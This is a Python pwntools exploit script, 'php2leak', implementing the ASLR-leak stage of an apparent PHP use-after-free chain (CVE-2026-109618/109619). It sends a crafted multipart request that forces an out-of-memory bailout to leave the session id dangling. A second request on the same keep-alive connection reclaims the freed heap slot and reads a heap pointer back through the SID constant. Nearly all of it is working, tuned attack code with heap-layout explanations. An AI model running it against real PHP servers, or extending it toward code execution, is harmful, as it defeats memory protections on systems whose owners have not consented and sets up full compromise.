#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2leak — remote ASLR leak via the SID constant (response body)
================================================================

Implements the *ASLR-leak stage* of the PHP2Shell chain
(CVE-2026-109618 + CVE-2026-109619, fixed in PHP 8.2.35 / 8.3.36 / 8.4.27 /
8.5.12).  We only leak a randomized address; we do not achieve a shell.

Target: php:8.4.26-apache-bookworm (libphp.so, x86_64, NTS, stock prefork MPM).

--------------------------------------------------------------------
THE BUG (CVE-2026-109619)
--------------------------------------------------------------------
PHP parses a multipart/form-data body during request startup, *before* any
module RINIT runs (main/main.c):

    php_hash_environment();     /* PRE-RINIT: parse multipart, fire the
                                 *   session upload-progress callback */
    zend_activate_modules();    /* RINIT runs only after the POST body   */
    PG(modules_activated) = 1;

The session upload-progress feature initializes the session inside that
Pre-RINIT window (ext/session/session.c).  When a later part of the body blows
past memory_limit, _zend_bailout() longjmps out; PG(modules_activated) is still
0, so php_request_shutdown() skips the session RSHUTDOWN hook, then
shutdown_memory_manager() wipes the request heap.  The worker survives with
PS(id) / PS(http_session_vars) still pointing into the freed heap (dangling).

On the next request, before RINIT resets those globals, ext/session reads the
stale PS(id) and reflects the reclaimed bytes back to us.

--------------------------------------------------------------------
THE REFLECTION (why the SID constant, not the cookie)
--------------------------------------------------------------------
php_session_reset_id() builds the SID constant *unconditionally* — it does not
depend on PS(send_cookie) (ext/session/session.c):

    if (PS(define_sid)) {
        smart_str var = {0};
        smart_str_appends(&var, PS(session_name));     // "PHPSESSID"
        smart_str_appendc(&var, '=');
        smart_str_appends(&var, ZSTR_VAL(PS(id)));     // dangling bytes, strlen
        smart_str_0(&var);
        REGISTER_STRINGL_CONSTANT("SID", ...);
    }

The application-agnostic Set-Cookie: PHPSESSID= channel would be cleaner, but
MULTIPART_EVENT_FILE_START force-clears PS(send_cookie) = 0, silencing it.  The
SID constant is the channel that still works: the target script just does
`echo SID`, and the raw reclaimed-heap bytes land in the response body.

--------------------------------------------------------------------
WHAT WE LEAK
--------------------------------------------------------------------
The leak request recycles the freed 64-byte PS(id) slot (Bin #7) with a packed
PHP array c[0..39]="V"*20.  A packed array stores its values as a contiguous run
of 16-byte zvals (Zend/zend_types.h), each holding a pointer to its value:

    zval:  +0x00 zend_value (ptr to "V"*20 zend_string)
           +0x08 u1.type_info = 0x0106  (IS_STRING | IS_TYPE_REFCOUNTED)
           +0x0c u2

ZSTR_VAL(PS(id)) now points into that run.  smart_str_appends() copies it with
strlen, i.e. the low 6 bytes of the first pointer up to its 0x00 high byte.
Canonical x86_64 user-space addresses have 0x00 in the top two bytes, so:

    ptr        = leaked6 + b"\x00\x00"     (little-endian)
    chunk_base = ptr & ~0x1fffff           (Zend MM chunks are 2 MB aligned)

This recovers the Zend MM chunk base — one ASLR-randomized address.  (Leaking
the libphp.so base instead would require recycling the slot with a zend_object,
whose +0x18 holds &std_object_handlers.)
"""

import os
import re
import struct
import sys
from pwn import remote, log, context

context.log_level = "info"

HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET_HOST", "target")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("TARGET_PORT", "80"))

# Zend MM chunks are mmap'd on a 2 MB (0x200000) boundary, so masking off the
# low 21 bits of any pointer inside the chunk yields the chunk base.
CHUNK_MASK = ~0x1FFFFF & ((1 << 64) - 1)


def mp(boundary, parts):
    """Build a multipart/form-data body.

    parts: list of dicts —
        {"name": b"...", "value": b"..."}                     -> form field
        {"name": b"...", "filename": b"...", "value": b"..."} -> file part
        {"raw": b"..."}                                       -> verbatim bytes
    """
    out = b""
    for p in parts:
        if "raw" in p:
            out += p["raw"]; continue
        out += b"--" + boundary + b"\r\n"
        disp = b'Content-Disposition: form-data; name="' + p["name"] + b'"'
        if "filename" in p:
            disp += b'; filename="' + p["filename"] + b'"'
            out += disp + b"\r\nContent-Type: application/octet-stream\r\n\r\n"
        else:
            out += disp + b"\r\n\r\n"
        out += p["value"] + b"\r\n"
    return out + b"--" + boundary + b"--\r\n"


def request(io, boundary, body):
    """Send one HTTP/1.1 POST over the shared socket and read one response.

    Both the arm and leak requests go over the SAME keep-alive connection:
    with Apache prefork MPM one child serves a connection for its whole
    lifetime, so both requests hit the same worker (same ASLR layout and the
    same stale .bss module globals).  That is what makes the cross-request
    use-after-free deterministic without any worker-pinning config.
    """
    head = (b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
            b"Connection: keep-alive\r\n"
            b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n")
    io.send(head + body)

    # Read until end of headers, then drain exactly Content-Length body bytes
    # (so the keep-alive socket is left positioned at the next response).
    data = b""
    while b"\r\n\r\n" not in data:
        c = io.recv(65536)
        if not c: break
        data += c
    hr, br = data.split(b"\r\n\r\n", 1)
    headers = {}
    for ln in hr.split(b"\r\n")[1:]:
        if b":" in ln:
            k, v = ln.split(b":", 1); headers[k.strip().lower()] = v.strip()
    n = int(headers.get(b"content-length", b"0"))
    while len(br) < n:
        c = io.recv(65536)
        if not c: break
        br += c
    return headers, br[:n]


def arm_body(boundary):
    """Request N — publish PS(id), then OOM to leave it dangling.

    Three pieces, in this exact order:

    1. PHP_SESSION_UPLOAD_PROGRESS form field -> progress->key is set, so the
       session upload-progress callback takes its Pre-RINIT path.

    2. PHPSESSID with value b"\\x00".  The upload-progress FORMDATA handler only
       captures the sid when value_len > 0, so a truly-empty value would be
       ignored and FILE_START would never fire.  b"\\x00" has length 1 (captured)
       yet ZSTR_VAL(PS(id))[0]=='\\0', so php_session_initialize() *regenerates*
       the id — that 64-byte Bin-#7 zend_string is the one that later dangles.

    3. A real file part ("f", filename="a") -> fires MULTIPART_EVENT_FILE_START,
       which publishes PS(id) low in heap->main_chunk (the chunk that stays
       mapped across the bailout).

    Then the amplifier (below) pushes Zend MM past memory_limit so
    _zend_bailout() aborts before RSHUTDOWN.
    """
    parts = [
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"pwn"},
        {"name": b"PHPSESSID", "value": b"\x00"},
        {"name": b"f", "filename": b"a", "value": b"x"},
    ]

    # Amplifier — Calif's empty-upload trick (main/rfc1867.c):
    # a file part with filename="" is NOT counted toward max_file_uploads, but
    # register_http_post_files_variable_ex() still builds all six $_FILES
    # sub-entries (name / full_path / type / tmp_name / error / size) under the
    # nested field name.  Six entries walking the same nested HashTable
    # hierarchy ~= 6x the amplification of a plain POST field.
    #
    # 990 parts x 62 deep x 6 entries x ~376 B  ~=  132 MB  >  memory_limit=128M,
    # while the body stays < 1 MB — inside post_max_size=8M, max_input_vars=1000
    # and max_input_nesting_level=64.  (The plain a[][]... amplifier caps out at
    # ~24 MB because of those two input limits.)
    depth, fields = 62, 990
    for i in range(fields):
        parts.append({"name": b"g[%d]" % i + b"[a]" * depth,
                      "filename": b"", "value": b""})
    return parts


def leak_body(boundary):
    """Request N+1 — recycle the freed PS(id) slot and reflect it via SID.

    * No file part -> MULTIPART_EVENT_FILE_START never fires, so the Pre-RINIT
      php_rinit_session(0) reset of PS(id) is skipped and the stale pointer
      survives until php_session_rfc1867_cleanup() -> php_session_initialize()
      -> php_session_reset_id() builds the SID constant from it.

    * A short PHPSESSID value ("Z") keeps progress->sid set (so the cleanup
      path is entered) but is only Bin #1, so it does not itself reclaim the
      freed 64-byte Bin-#7 slot.

    * The packed array c[0..39]="V"*20 does reclaim that slot: its arData is a
      contiguous run of 40 zvals, each a pointer to a "V"*20 zend_string.
    """
    parts = [
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"leak"},
        {"name": b"PHPSESSID", "value": b"Z"},
    ]
    for i in range(40):
        parts.append({"name": b"c[%d]" % i, "value": b"V" * 20})
    return parts


def main():
    b = b"----Xdeadbeef"          # boundary is part of the heap-layout tuning
    io = remote(HOST, PORT)

    # --- Request N: arm (publish PS(id), OOM -> dangling) ---
    hd, bd = request(io, b, mp(b, arm_body(b)))
    # The OOM bailout shows up as the "Allowed memory size ... exhausted" fatal
    # in the response body (mod_php returns HTTP 200 with the error inline).
    oom = b"Allowed memory size" in bd or b"exhausted" in bd
    log.info("arm -> OOM bailout: %s", oom)
    if not oom:
        log.warning("arm did not OOM; check memory_limit=128M and the "
                    "empty-upload amplifier (990 parts x 62 deep)")

    # --- Request N+1: leak via the SID constant (same keep-alive socket) ---
    hd, bd = request(io, b, mp(b, leak_body(b)))

    # index.php echoes:  SID=PHPSESSID=<raw reclaimed bytes>\n
    m = re.search(rb"SID=PHPSESSID=([^\r\n]*)", bd)
    if not m:
        log.failure("SID constant not found in response body:\n%r", bd)
        return 1

    raw = m.group(1)             # the strlen-truncated bytes (up to first NUL)
    log.info("SID leaked %d bytes: %s", len(raw), raw.hex())

    # A canonical heap pointer's low 6 bytes end at its 0x00 high byte, so we
    # expect exactly 6 bytes here; anything less means the reclaim landed in the
    # wrong bin (heap alignment shifted).
    if len(raw) < 6:
        log.warning("too few bytes leaked (reclaim landed wrong; re-run)")
        return 1

    # Reconstruct the 8-byte pointer (top two bytes of a canonical user-space
    # address are 0x00) and mask to the 2 MB-aligned chunk base.
    ptr = struct.unpack("<Q", raw[:6] + b"\x00\x00")[0]
    chunk_base = ptr & CHUNK_MASK
    log.info("heap ptr = 0x%016x", ptr)
    log.success("Zend MM chunk base (ASLR): 0x%016x", chunk_base)
    io.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
